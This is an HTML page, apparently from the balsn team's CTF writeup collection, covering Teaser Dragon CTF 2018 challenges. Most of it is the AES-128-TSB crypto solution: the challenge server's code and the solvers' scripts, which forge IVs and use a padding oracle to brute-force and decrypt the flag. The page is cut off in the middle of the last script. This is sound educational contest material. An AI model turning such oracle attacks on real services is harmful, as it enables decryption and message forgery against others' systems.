@@ -1,0 +1,911 @@
+<!DOCTYPE HTML>
+<!-- This page is modified from the template https://www.codeply.com/go/7XYosZ7VH5 by Carol Skelly (@iatek). -->
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>Teaser Dragon CTF 2018</title>
+    <link type="text/css" rel="stylesheet" href="../assets/css/github-markdown.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/pilcrow.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/hljs-github.min.css"/>
+    <link type="text/css" rel="stylesheet" href="../assets/css/bootstrap-4.0.0-beta.3.min.css">
+    <script type="text/javascript" src="../assets/js/jquery-3.3.1.slim.min.js"></script>
+    <script type="text/javascript" src="../assets/js/bootstrap-4.0.0-beta.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/popper-1.14.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/mathjax-2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+  </head>
+  <style>
+  body {
+      padding-top: 56px;
+  }
+
+  .sticky-offset {
+      top: 56px;
+  }
+
+  #body-row {
+      margin-left:0;
+      margin-right:0;
+  }
+  #sidebar-container {
+      min-height: 100vh;   
+      background-color: #333;
+      padding: 0;
+  }
+
+  /* Sidebar sizes when expanded and expanded */
+  .sidebar-expanded {
+      width: 230px;
+  }
+  .sidebar-collapsed {
+      width: 60px;
+  }
+
+  /* Menu item*/
+  #sidebar-container .list-group a {
+      height: 50px;
+      color: white;
+  }
+
+  /* Submenu item*/
+  #sidebar-container .list-group .sidebar-submenu a {
+      height: 45px;
+      padding-left: 60px;
+  }
+  .sidebar-submenu {
+      font-size: 0.9rem;
+  }
+
+  /* Separators */
+  .sidebar-separator-title {
+      background-color: #333;
+      height: 35px;
+  }
+  .sidebar-separator {
+      background-color: #333;
+      height: 25px;
+  }
+  .logo-separator {
+      background-color: #333;    
+      height: 60px;
+  }
+
+
+  /* 
+   active scrollspy
+  */
+  .list-group-item.active {
+    border-color: transparent;
+    border-left: #e69138 solid 4px;
+  }
+
+  /* 
+   anchor padding top
+   https://stackoverflow.com/a/28824157
+  */
+  :target:before {
+    content:"";
+    display:block;
+    height:56px; /* fixed header height*/
+    margin:-56px 0 0; /* negative fixed header height */
+  }
+  </style>
+  
+  <script>
+  // https://stackoverflow.com/a/48330533
+  $(window).on('activate.bs.scrollspy', function (event) {
+    let active_collapse = $($('.list-group-item.active').parents()[0]);
+    $(".collapse").removeClass("show");
+    active_collapse.addClass("show");
+
+    let parent_menu = $('a[href="#' + active_collapse[0].id + '"]');
+    $('a[href^="#submenu"]').css("border-left", "");
+    parent_menu.css("border-left","#e69138 solid 4px");
+  });
+
+  // http://docs.mathjax.org/en/latest/tex.html#tex-and-latex-math-delimiters
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      processEscapes: true
+    }
+  });
+  </script>
+
+  <body style="position: relative;" data-spy="scroll" data-target=".sidebar-submenu" data-offset="70">
+    <nav class="navbar navbar-expand-md navbar-light bg-light fixed-top">
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <a class="navbar-brand" href="https://github.com/balsn/ctf_writeup">
+        <img src="https://assets-cdn.github.com/images/modules/logos_page/GitHub-Mark.png" class="d-inline-block align-top" alt="" width="30" height="30">
+        <span class="menu-collapsed">balsn / ctf_writeup</span>
+      </a>
+      <div class="collapse navbar-collapse" id="navbarNavDropdown">
+        <ul class="navbar-nav my-2 my-lg-0">
+            
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+        
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                misc
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#sanity-check">sanity-check</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                rev
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#chains-of-trust">chains-of-trust</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                crypto
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#aes-128-tsb">aes-128-tsb</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                pwn
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                web
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#nodepad">nodepad</a>
+    
+                <a class="dropdown-item" href="#3nterprise-s0lution">3nterprise-s0lution</a>
+    
+              </div>
+            </li>
+    
+        </ul>
+      </div>
+      <div class="navbar-collapse collapse w-100 order-3 dual-collapse2">
+        <ul class="navbar-nav ml-auto">
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+        </ul>
+      </div>
+    </nav>
+    <div class="row" id="body-row">
+      <div id="sidebar-container" class="sidebar-expanded d-none d-md-block col-2">
+        <ul class="list-group sticky-top sticky-offset">
+          
+          <a href="#submenu0" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">misc</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu0" class="collapse sidebar-submenu">
+            <a href="#sanity-check" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">sanity-check</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu1" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">rev</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu1" class="collapse sidebar-submenu">
+            <a href="#chains-of-trust" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">chains-of-trust</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu2" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">crypto</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu2" class="collapse sidebar-submenu">
+            <a href="#aes-128-tsb" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">aes-128-tsb</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu3" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">pwn</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu3" class="collapse sidebar-submenu">
+            
+          </div>
+    
+          <a href="#submenu4" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">web</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu4" class="collapse sidebar-submenu">
+            <a href="#nodepad" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">nodepad</span>
+            </a>
+    
+<a href="#3nterprise-s0lution" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">3nterprise-s0lution</span>
+            </a>
+    
+          </div>
+    
+        </ul>
+      </div>
+      <div class="col-10 py-3">
+        <article class="markdown-body"><h1 id="teaser-dragon-ctf-2018"><a class="header-link" href="#teaser-dragon-ctf-2018"></a>Teaser Dragon CTF 2018</h1>
+
+<h2 id="misc"><a class="header-link" href="#misc"></a>Misc</h2>
+<h3 id="sanity-check"><a class="header-link" href="#sanity-check"></a>Sanity check</h3>
+<p>This is a hello world challenge but it still takes me about 20 minutes...... because I try to use openmailbox as the registered email, only to find <code>openmailbox.org</code> is down.......</p>
+<p>Just login into the IRC channel and get the flag <code>DrgnS{Good_work!_This_is_what_a_flag_looks_like}</code>.</p>
+<h2 id="rev"><a class="header-link" href="#rev"></a>Rev</h2>
+<h3 id="chains-of-trust"><a class="header-link" href="#chains-of-trust"></a>Chains of trust</h3>
+<h4 id="tl;dr"><a class="header-link" href="#tl;dr"></a>TL;DR</h4>
+<ol class="list">
+<li>Delay the delivery of shellcodes with a MitM proxy</li>
+<li>Find out which one is the checker by observing the timing of message No luck.</li>
+<li>Modify the checker to print encrypted input</li>
+<li>Bruteforce the flag</li>
+</ol>
+<p><a href="https://github.com/sasdf/ctf-tasks-writeup/blob/master/writeup/2018/TeaserDragon/rev/Chains%20of%20trust/README.md">writeup</a></p>
+<h2 id="crypto"><a class="header-link" href="#crypto"></a>Crypto</h2>
+<h3 id="aes-128-tsb"><a class="header-link" href="#aes-128-tsb"></a>AES-128-TSB</h3>
+<p>Here is the server&#39;s script</p>
+<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/env python2</span>
+<span class="hljs-keyword">import</span> SocketServer
+<span class="hljs-keyword">import</span> socket
+<span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES
+<span class="hljs-keyword">from</span> Crypto.Random <span class="hljs-keyword">import</span> get_random_bytes
+<span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack, unpack
+
+<span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> AES_KEY, FLAG
+
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CryptoError</span><span class="hljs-params">(Exception)</span>:</span>
+    <span class="hljs-keyword">pass</span>
+
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">split_by</span><span class="hljs-params">(data, step)</span>:</span>
+    <span class="hljs-keyword">return</span> [data[i : i+step] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">0</span>, len(data), step)]
+
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">xor</span><span class="hljs-params">(a, b)</span>:</span>
+    <span class="hljs-keyword">assert</span> len(a) == len(b)
+    <span class="hljs-keyword">return</span> <span class="hljs-string">''</span>.join([chr(ord(ai)^ord(bi)) <span class="hljs-keyword">for</span> ai, bi <span class="hljs-keyword">in</span> zip(a,b)])
+
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pad</span><span class="hljs-params">(msg)</span>:</span>
+    byte = <span class="hljs-number">16</span> - len(msg) % <span class="hljs-number">16</span>
+    <span class="hljs-keyword">return</span> msg + chr(byte) * byte
+
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">unpad</span><span class="hljs-params">(msg)</span>:</span>
+    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> msg:
+        <span class="hljs-keyword">return</span> <span class="hljs-string">''</span>
+    <span class="hljs-keyword">return</span> msg[:-ord(msg[<span class="hljs-number">-1</span>])]
+
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">tsb_encrypt</span><span class="hljs-params">(aes, msg)</span>:</span>
+    msg = pad(msg)
+    iv = get_random_bytes(<span class="hljs-number">16</span>)
+    prev_pt = iv
+    prev_ct = iv
+    ct = <span class="hljs-string">''</span>
+    <span class="hljs-keyword">for</span> block <span class="hljs-keyword">in</span> split_by(msg, <span class="hljs-number">16</span>) + [iv]:
+        ct_block = xor(block, prev_pt)
+        <span class="hljs-keyword">print</span> (<span class="hljs-string">'ct_block 1 : '</span>, list(bytes(ct_block)))
+        ct_block = aes.encrypt(ct_block)
+        <span class="hljs-keyword">print</span> (<span class="hljs-string">'ct_block 2 : '</span>, list(bytes(ct_block)))
+        ct_block = xor(ct_block, prev_ct)
+        ct += ct_block
+        prev_pt = block
+        prev_ct = ct_block
+    <span class="hljs-keyword">return</span> iv + ct
+
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">tsb_decrypt</span><span class="hljs-params">(aes, msg)</span>:</span>
+    iv, msg = msg[:<span class="hljs-number">16</span>], msg[<span class="hljs-number">16</span>:]
+    prev_pt = iv
+    prev_ct = iv
+    pt = <span class="hljs-string">''</span>
+    <span class="hljs-keyword">for</span> block <span class="hljs-keyword">in</span> split_by(msg, <span class="hljs-number">16</span>):
+        pt_block = xor(block, prev_ct)
+        pt_block = aes.decrypt(pt_block)
+        pt_block = xor(pt_block, prev_pt)
+        pt += pt_block
+        prev_pt = pt_block
+        prev_ct = block
+    pt, mac = pt[:<span class="hljs-number">-16</span>], pt[<span class="hljs-number">-16</span>:]
+    <span class="hljs-keyword">if</span> mac != iv:
+        <span class="hljs-keyword">raise</span> CryptoError()
+    <span class="hljs-keyword">return</span> unpad(pt)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">send_binary</span><span class="hljs-params">(s, msg)</span>:</span>
+    s.sendall(pack(<span class="hljs-string">'&lt;I'</span>, len(msg)))
+    s.sendall(msg)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">send_enc</span><span class="hljs-params">(s, aes, msg)</span>:</span>
+    send_binary(s, tsb_encrypt(aes, msg))
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">recv_exact</span><span class="hljs-params">(s, length)</span>:</span>
+    buf = <span class="hljs-string">''</span>
+    <span class="hljs-keyword">while</span> length &gt; <span class="hljs-number">0</span>:
+        data = s.recv(length)
+        <span class="hljs-keyword">if</span> data == <span class="hljs-string">''</span>:
+            <span class="hljs-keyword">raise</span> EOFError()
+        buf += data
+        length -= len(data)
+    <span class="hljs-keyword">return</span> buf
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">recv_binary</span><span class="hljs-params">(s)</span>:</span>
+    size = recv_exact(s, <span class="hljs-number">4</span>)
+    size = unpack(<span class="hljs-string">'&lt;I'</span>, size)[<span class="hljs-number">0</span>]
+    <span class="hljs-keyword">return</span> recv_exact(s, size)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">recv_enc</span><span class="hljs-params">(s, aes)</span>:</span>
+    data = recv_binary(s)
+    <span class="hljs-keyword">return</span> tsb_decrypt(aes, data)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">(s)</span>:</span>
+    aes = AES.new(AES_KEY, AES.MODE_ECB)
+    <span class="hljs-keyword">try</span>:
+        <span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:
+            a = recv_binary(s)
+            b = recv_enc(s, aes)
+            <span class="hljs-keyword">if</span> a == b:
+                <span class="hljs-keyword">if</span> a == <span class="hljs-string">'gimme_flag'</span>:
+                    send_enc(s, aes, FLAG)
+                <span class="hljs-keyword">else</span>:
+                    <span class="hljs-comment"># Invalid request, send some random garbage instead of the</span>
+                    <span class="hljs-comment"># flag :)</span>
+                    send_enc(s, aes, get_random_bytes(len(FLAG)))
+            <span class="hljs-keyword">else</span>:
+                send_binary(s, <span class="hljs-string">'Looks like you don\'t know the secret key? Too bad.'</span>)
+    <span class="hljs-keyword">except</span> (CryptoError, EOFError):
+        <span class="hljs-keyword">pass</span>
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TaskHandler</span><span class="hljs-params">(SocketServer.BaseRequestHandler)</span>:</span>
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">handle</span><span class="hljs-params">(self)</span>:</span>
+        main(self.request)
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
+    SocketServer.ThreadingTCPServer.allow_reuse_address = <span class="hljs-keyword">True</span>
+    server = SocketServer.ThreadingTCPServer((<span class="hljs-string">'0.0.0.0'</span>, <span class="hljs-number">1337</span>), TaskHandler)
+    server.serve_forever()</code></pre><p>Just notice that if we send <code>(arbitary_iv + arbitary_16bytes + arbitary_iv)</code> to <code>tsb_decrypt</code>, we can pass the <code>mac is iv</code> check.
+We can exploit this by first sending a <code>&#39;\x00&#39;*4</code>  to make <code>a</code> become <code>&#39;&#39;</code>, then send <code>&#39;\x30\x00\x00\x00&#39;</code> and input <code>(arbitary_iv + arbitary_16bytes + arbitary_iv)</code> to <code>b = recv_enc(s, aes)</code>. Therefore with modifying last byte of <code>arbitary_iv</code>, we can get 15 possible values of last byte of decrypted <code>arbitary_16bytes</code> (which is handled by <code>f1()</code>), then simply bruteforce it out (which is handled by <code>f2()</code>).</p>
+<pre class="hljs"><code><span class="hljs-comment"># find out all numbers y i.e. 0 &lt;= y ^ x_i &lt; 16 for some x_i in x</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">guess</span><span class="hljs-params">(x)</span>:</span>
+    ret = []
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">256</span>):
+        y = (np.array([i ^ j <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> x]) &lt; <span class="hljs-number">16</span>).all()
+        <span class="hljs-keyword">if</span>(y):
+            ret.append(y)
+    <span class="hljs-keyword">return</span> ret
+
+<span class="hljs-comment"># r = pwn.remote(host, port)</span>
+<span class="hljs-comment"># partial_flag means "arbitary_16bytes" here</span>
+<span class="hljs-comment"># new_payload means first 15 bytes of "arbitary_iv", I use '\x00'*15 here</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">f1</span><span class="hljs-params">()</span>:</span>
+    total = []
+    counter = <span class="hljs-number">15</span>
+    trying = <span class="hljs-number">-1</span>
+    <span class="hljs-keyword">while</span>(counter):
+        trying += <span class="hljs-number">1</span>
+        <span class="hljs-keyword">print</span> (trying)
+        <span class="hljs-comment"># first let a == ''</span>
+        r.send(<span class="hljs-string">'\x00'</span>*<span class="hljs-number">4</span>)
+
+        <span class="hljs-comment"># now try all possible padding length (a.k.a. the last</span>
+        <span class="hljs-comment"># byte of decrypted msg of b) to find out possible value             # of last byte of decrypted msg of b</span>
+        r.send(<span class="hljs-string">'\x30\x00\x00\x00'</span>)
+        r.send(new_payload + chr(trying) + partial_flag[:<span class="hljs-number">15</span>] + chr(ord(partial_flag[<span class="hljs-number">-1</span>]) ^ trying ^ ord(last_payload)) + new_payload + chr(trying))
+        size = unpack(<span class="hljs-string">'&lt;I'</span>, r.recv(<span class="hljs-number">4</span>))[<span class="hljs-number">0</span>]
+        x = r.recv(size)
+        <span class="hljs-keyword">if</span>(<span class="hljs-string">'Looks'</span> <span class="hljs-keyword">in</span> x):
+            <span class="hljs-comment"># which means padding size &lt;= 15</span>
+            total.append(trying)
+            counter -= <span class="hljs-number">1</span>
+    <span class="hljs-keyword">return</span> (total)
+
+ret1 = f1()
+
+<span class="hljs-comment"># bruteforce to find out what exactly last byte of decrypted msg is</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">f2</span><span class="hljs-params">(pos)</span>:</span>
+    <span class="hljs-keyword">for</span> trying <span class="hljs-keyword">in</span> pos:
+        <span class="hljs-keyword">for</span> length <span class="hljs-keyword">in</span> range(<span class="hljs-number">256</span>):
+            <span class="hljs-keyword">print</span> (length)
+            <span class="hljs-comment"># let a become chr(length)</span>
+            r.send(<span class="hljs-string">'\x01\x00\x00\x00'</span>)
+            r.send(chr(length))
+            <span class="hljs-comment"># try to find out what is last byte of</span>
+            <span class="hljs-comment"># decrypted msg</span>
+            r.send(<span class="hljs-string">'\x30\x00\x00\x00'</span>)
+            r.send(new_payload + chr(trying) + partial_flag[:<span class="hljs-number">15</span>] + chr(ord(partial_flag[<span class="hljs-number">-1</span>]) ^ trying ^ ord(last_payload)) + new_payload + chr(trying))
+            size = unpack(<span class="hljs-string">'&lt;I'</span>, r.recv(<span class="hljs-number">4</span>))[<span class="hljs-number">0</span>]
+            x = r.recv(size)
+            <span class="hljs-keyword">if</span>(<span class="hljs-string">'Looks'</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> x):
+                <span class="hljs-comment"># which means after unpadding the msg</span>
+                <span class="hljs-comment"># become one byte and its value is</span>
+                <span class="hljs-comment"># exactly chr(length)</span>
+                <span class="hljs-keyword">return</span> (length, trying)
+ret2_1, ret2_2 = f2(guess(ret1))</code></pre><p>Now we can control the padding length of decrypted <code>arbitary_16bytes</code>, thus we can bruteforce it byte by byte (which is handled by <code>f3()</code>)</p>
+<pre class="hljs"><code><span class="hljs-comment"># gradually bruteforce each byte of decrypted msg</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">f3</span><span class="hljs-params">(start, end)</span>:</span>
+    payload = chr(start)
+    <span class="hljs-keyword">for</span> testing <span class="hljs-keyword">in</span> [<span class="hljs-number">14</span>, <span class="hljs-number">13</span>, <span class="hljs-number">12</span>, <span class="hljs-number">11</span>, <span class="hljs-number">10</span>, <span class="hljs-number">9</span>, <span class="hljs-number">8</span>, <span class="hljs-number">7</span>, <span class="hljs-number">6</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>]:
+        trying = end ^ testing
+        <span class="hljs-keyword">for</span> length <span class="hljs-keyword">in</span> range(<span class="hljs-number">256</span>):
+            <span class="hljs-keyword">print</span> (length)
+            <span class="hljs-comment"># let a become payload + chr(length)</span>
+            r.send(chr(<span class="hljs-number">16</span> - testing) + <span class="hljs-string">'\x00'</span>*<span class="hljs-number">3</span>)
+            r.send(payload + chr(length))
+
+            <span class="hljs-comment"># fix (16 - testing)th byte of decrypted msg and</span>
+            <span class="hljs-comment"># bruteforce it</span>
+            r.send(<span class="hljs-string">'\x30\x00\x00\x00'</span>)
+            sending = new_payload + chr(trying) + partial_flag[:<span class="hljs-number">15</span>] + chr(ord(partial_flag[<span class="hljs-number">-1</span>]) ^ trying ^ ord(last_payload))  + new_payload + chr(trying)
+            r.send(sending)
+            size = unpack(<span class="hljs-string">'&lt;I'</span>, r.recv(<span class="hljs-number">4</span>))[<span class="hljs-number">0</span>]
+            x = r.recv(size)
+            <span class="hljs-keyword">if</span>(<span class="hljs-string">'Looks'</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> x):
+                <span class="hljs-comment"># the (16 - testing)th byte of decrypted</span>
+                <span class="hljs-comment"># msg is exactly chr(length)</span>
+                payload += chr(length)
+                <span class="hljs-keyword">print</span> (<span class="hljs-string">'now payload : '</span>, [ord(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> payload])
+                <span class="hljs-keyword">print</span> (<span class="hljs-string">'payload length : '</span>, len(payload))
+                <span class="hljs-keyword">break</span>
+    <span class="hljs-comment"># this is the final decrypted msg</span>
+    <span class="hljs-keyword">print</span> ([ord(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> payload])
+<span class="hljs-comment"># since ret2_2 can make the padding length become 15, the value of last</span>
+<span class="hljs-comment"># byte of decrypted msg is exacly ret2_2 ^ 15</span>
+ret3 = f3(ret2_1, ret2_2 ^ <span class="hljs-number">15</span>)</code></pre><p>Now we know the decrypted value of <code>arbitary_16bytes</code> with <code>arbitary_iv</code>, so we can modify <code>arbitary_iv</code> to let the decrypted value of <code>arbitary_16bytes</code> become <code>gimme_flag</code>, and we will receive a 96 bytes encrypted flag. Then use the following script to decrypt it</p>
+<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/python</span>
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+<span class="hljs-keyword">import</span> time
+<span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> *
+
+<span class="hljs-comment"># find out all numbers y i.e. 0 &lt;= y ^ x_i &lt; 16 for some x_i in x</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">guess</span><span class="hljs-params">(x)</span>:</span>
+    ret = []
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">256</span>):
+        y = (np.array([i ^ j <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> x]) &lt; <span class="hljs-number">16</span>).all()
+        <span class="hljs-keyword">if</span>(y):
+            ret.append(y)
+    <span class="hljs-keyword">return</span> ret
+
+host = <span class="hljs-string">'aes-128-tsb.hackable.software'</span>
+port = <span class="hljs-number">1337</span>
+r = remote(host, port)
+counter = <span class="hljs-number">15</span>
+match = []
+trying = <span class="hljs-number">-1</span>
+flag = [<span class="hljs-number">170</span>, <span class="hljs-number">235</span>, <span class="hljs-number">242</span>, <span class="hljs-number">177</span>, <span class="hljs-number">164</span>, <span class="hljs-number">189</span>, <span class="hljs-number">197</span>, <span class="hljs-number">16</span>, <span class="hljs-number">240</span>, <span class="hljs-number">8</span>, <span class="hljs-number">6</span>, <span class="hljs-number">50</span>, <span class="hljs-number">253</span>, <span class="hljs-number">224</span>, <span class="hljs-number">93</span>, <span class="hljs-number">163</span>, <span class="hljs-number">154</span>, <span class="hljs-number">120</span>, <span class="hljs-number">72</span>, <span class="hljs-number">199</span>, <span class="hljs-number">204</span>, <span class="hljs-number">208</span>, <span class="hljs-number">11</span>, <span class="hljs-number">220</span>, <span class="hljs-number">94</span>, <span class="hljs-number">119</span>, <span class="hljs-number">14</span>, <span class="hljs-number">87</span>, <span class="hljs-number">136</span>, <span class="hljs-number">130</span>, <span class="hljs-number">91</span>, <span class="hljs-number">75</span>, <span class="hljs-number">165</span>, <span class="hljs-number">134</span>, <span class="hljs-number">246</span>, <span class="hljs-number">22</span>, <span class="hljs-number">233</span>, <span class="hljs-number">223</span>, <span class="hljs-number">20</span>, <span class="hljs-number">158</span>, <span class="hljs-number">227</span>, <span class="hljs-number">134</span>, <span class="hljs-number">34</span>, <span class="hljs-number">93</span>, <span class="hljs-number">113</span>, <span class="hljs-number">220</span>, <span class="hljs-number">191</span>, <span class="hljs-number">21</span>, <span class="hljs-number">60</span>, <span class="hljs-number">35</span>, <span class="hljs-number">43</span>, <span class="hljs-number">249</span>, <span class="hljs-number">137</span>, <span class="hljs-number">45</span>, <span class="hljs-number">175</span>, <span class="hljs-number">145</span>, <span class="hljs-number">4</span>, <span class="hljs-number">65</span>, <span class="hljs-number">97</span>, <span class="hljs-number">107</span>, <span class="hljs-number">34</span>, <span class="hljs-number">226</span>, <span class="hljs-number">216</span>, <span class="hljs-number">132</span>, <span class="hljs-number">87</span>, <span class="hljs-number">175</span>, <span class="hljs-number">1</span>, <span class="hljs-number">188</span>, <span class="hljs-number">12</span>, <span class="hljs-number">101</span>, <span class="hljs-number">197</span>, <span class="hljs-number">35</span>, <span class="hljs-number">241</span>, <span class="hljs-number">201</span>, <span class="hljs-number">163</span>, <span class="hljs-number">25</span>, <span class="hljs-number">98</span>, <span class="hljs-number">102</span>, <span class="hljs-number">45</span>, <span class="hljs-number">236</span>, <span class="hljs-number">177</span>, <span class="hljs-number">20</span>, <span class="hljs-number">179</span>, <span class="hljs-number">187</span>, <span class="hljs-number">111</span>, <span class="hljs-number">167</span>, <span class="hljs-number">41</span>, <span class="hljs-number">155</span>, <span class="hljs-number">127</span>, <span class="hljs-number">121</span>, <span class="hljs-number">199</span>, <span class="hljs-number">21</span>, <span class="hljs-number">96</span>, <span class="hljs-number">119</span>, <span class="hljs-number">46</span>, <span class="hljs-number">174</span>]
+offset = <span class="hljs-number">0</span>
+
+prev = flag[:<span class="hljs-number">16</span>]
+final_flag = <span class="hljs-string">''</span>
+<span class="hljs-keyword">for</span> offset <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, <span class="hljs-number">64</span>, <span class="hljs-number">16</span>):
+    partial_flag = <span class="hljs-string">''</span>.join([chr(flag[i+offset+<span class="hljs-number">16</span>]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">16</span>)])
+    key = flag[:<span class="hljs-number">16</span>]
